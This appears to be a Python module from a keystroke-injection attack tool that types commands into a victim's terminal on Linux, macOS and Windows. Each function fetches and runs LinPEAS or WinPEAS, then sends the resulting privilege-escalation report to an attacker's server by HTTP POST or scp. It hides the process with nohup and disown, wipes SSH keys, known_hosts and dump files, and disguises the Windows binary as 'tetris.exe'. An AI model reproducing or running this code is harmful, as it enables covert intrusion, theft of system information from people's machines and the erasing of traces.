from .utils import *
    
def LinuxPrivEscRecWebserver(vlue, server):
    sequence = [LINUX_TERMINAL]    
    linpeas = (
        "nohup bash -c '"
        f"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee dump.txt && curl -X POST -F 'file=@dump.txt' {server} &&"
        "rm -f dump.txt nohup.out' > /dev/null 2>&1 & disown"
    )
    
    exitTerm = "exit"
    
    
    for i in stringSeq(linpeas):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    
    time.sleep(1)
    sequence = []
    
    for i in stringSeq(exitTerm):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    

def LinuxPrivEscRecSsh(vlue, server, serverPassword, serverFolder):
    sequence = [LINUX_TERMINAL]
    sshKeyGen = 'ssh-keygen -t rsa -f /home/$(whoami)/.ssh/linpeasKeys'
    sshKeyShare = f'ssh-copy-id -i ~/.ssh/linpeasKeys.pub {server}'
    yesForConnect = 'yes'
    serverPassword = f'{serverPassword}'
    
    
    for i in stringSeq(sshKeyGen):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.03)
    
    sequence = []
    sequence.append(ENTER)
    sequence.append(ENTER)
    sequence.append(ENTER)
    sequence.append(ENTER)
    
    for i in stringSeq(sshKeyShare):
        sequence.append(i)
    sequence.append(ENTER)
    
    time.sleep(2)
    sendKeys(sequence, vlue, 0.03)
    
    sequence = []
    
    for i in stringSeq(yesForConnect):
        sequence.append(i)
    sequence.append(ENTER)
    time.sleep(1)
    sendKeys(sequence, vlue, 0.03)
    
    sequence = []
    
    for i in stringSeq(serverPassword):
        sequence.append(i)
    sequence.append(ENTER)
    
    time.sleep(1)
    sendKeys(sequence, vlue, 0.03)
    
    sequence = []
    
    linpeas = (
        "nohup bash -c '"
        "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee dump.txt && "
        f"scp -i /home/$(whoami)/.ssh/linpeasKeys dump.txt {server}:{serverFolder}/ && "
        "rm -f /home/$(whoami)/.ssh/linpeasKeys /home/$(whoami)/.ssh/linpeasKeys.pub && "
        "echo \"\" > /home/$(whoami)/.ssh/known_hosts && "
        "echo \"\" > /home/$(whoami)/.ssh/known_hosts.old && "
        "rm -f dump.txt nohup.out' > /dev/null 2>&1 & disown"
    )
    
    exitTerm = 'exit'
    
    for i in stringSeq(linpeas):
        sequence.append(i)
    sequence.append(ENTER)
    
    for i in stringSeq(exitTerm):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    
def MacPrivEscRecSsh(vlue, server, serverPassword, serverFolder):
    sequence = [MAC_TERMINAL]
    terminal = "terminal"
    sshKeyGen = 'ssh-keygen -t rsa -f /Users/$(whoami)/.ssh/linpeasKeys'
    sshKeyShare = f'ssh-copy-id -i ~/.ssh/linpeasKeys.pub {server}'
    serverPassword = f'{serverPassword}'
    yesForConnect = 'yes'
    
    for i in stringSeq(terminal):
        sequence.append(i)
    sequence.append(ENTER)
    
    # Générer la clé SSH
    for i in stringSeq(sshKeyGen):
        sequence.append(i)
    sequence.append(ENTER)
    
    
    sendKeys(sequence, vlue, 0.03)
    
    sequence = []
    sequence.append(ENTER)
    sequence.append(ENTER)
    sequence.append(ENTER)
    
    # Copier la clé SSH sur le serveur distant
    for i in stringSeq(sshKeyShare):
        sequence.append(i)
    sequence.append(ENTER)
    
    time.sleep(3)
    sendKeys(sequence, vlue, 0.03)
    
    sequence = []
    
    # Accepter la connexion SSH (si nécessaire)
    for i in stringSeq(yesForConnect):
        sequence.append(i)
    sequence.append(ENTER)
    time.sleep(1)
    sendKeys(sequence, vlue, 0.03)
    
    sequence = []
    
    # Entrer le mot de passe pour la connexion SSH
    for i in stringSeq(serverPassword):
        sequence.append(i)
    sequence.append(ENTER)
    
    time.sleep(1)
    sendKeys(sequence, vlue, 0.03)
    
    sequence = []
    
    # Préparer et exécuter linpeas avec nettoyage des fichiers après exécution
    linpeas = (
        "nohup bash -c '"
        "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee dump.txt && "
        f"scp dump.txt {server}:{serverFolder}/ && "
        "rm -f /Users/$(whoami)/.ssh/id_rsa /Users/$(whoami)/.ssh/id_rsa.pub && "
        "echo \"\" > /Users/$(whoami)/.ssh/known_hosts && "
        "echo \"\" > /Users/$(whoami)/.ssh/known_hosts.old && "
        "rm -f dump.txt nohup.out' > /dev/null 2>&1 & disown"
    )
    
    exitTerm = 'exit'
    
    # Envoyer la commande
    for i in stringSeq(linpeas):
        sequence.append(i)
    sequence.append(ENTER)
    
    for i in stringSeq(exitTerm):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)

def MacPrivEscRecWebserver(vlue, server):
    sequence = [MAC_TERMINAL]
    terminal = "terminal"
    linpeas = (
        'nohup bash -c "'
        f"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee dump.txt && curl -X POST -F 'file=@dump.txt' {server} &&"
        'rm -f dump.txt nohup.out" > /dev/null 2>&1 & disown'
    )
    
    exitTerm = "exit"
    
    for i in stringSeq(terminal):
        sequence.append(i)
    sequence.append(ENTER)
    
    for i in stringSeq(linpeas):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    
    time.sleep(1)
    sequence = []
    
    for i in stringSeq(exitTerm):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    
def WindowsPrivEscRecWebserver(vlue, server):
    sequence = [KeyCode.LEFT_UI]
    ps = 'powershell'
    
    for i in stringSeq(ps):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.03)
    sequence = []
    
    
    winpeas = [
        '$myName = $env:USERNAME',
        'Invoke-WebRequest -Uri "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe" -OutFile "C:\\Users\\$myName\\tetris.exe"',
    ]
        
    for winpeasLine in winpeas:
        for i in stringSeq(winpeasLine):
            sequence.append(i)
        sequence.append(ENTER)
    
    time.sleep(2)
    sendKeys(sequence, vlue, 0.01)
    
    sequence = []

    finaldCommand1 = f'C:\\Users\\$myName\\tetris.exe | Out-File -FilePath "C:\\Users\\$myName\\tetris_readme.txt"; Invoke-RestMethod -Uri "{server}"'
    finaldCommand2 = ' -Method Post -FormData @{file = Get-Item "C:\\Users\\$myName\\tetris_readme.txt"}; Remove-Item "C:\\Users\\$myName\\tetris.exe", "C:\\Users\\$myName\\tetris_readme.txt"'

    for i in stringSeq(finaldCommand1):
        sequence.append(i)
    for i in stringSeq(finaldCommand2):
        sequence.append(i)
    sequence.append(ENTER)
    
    time.sleep(10)
    sendKeys(sequence, vlue, 0.01)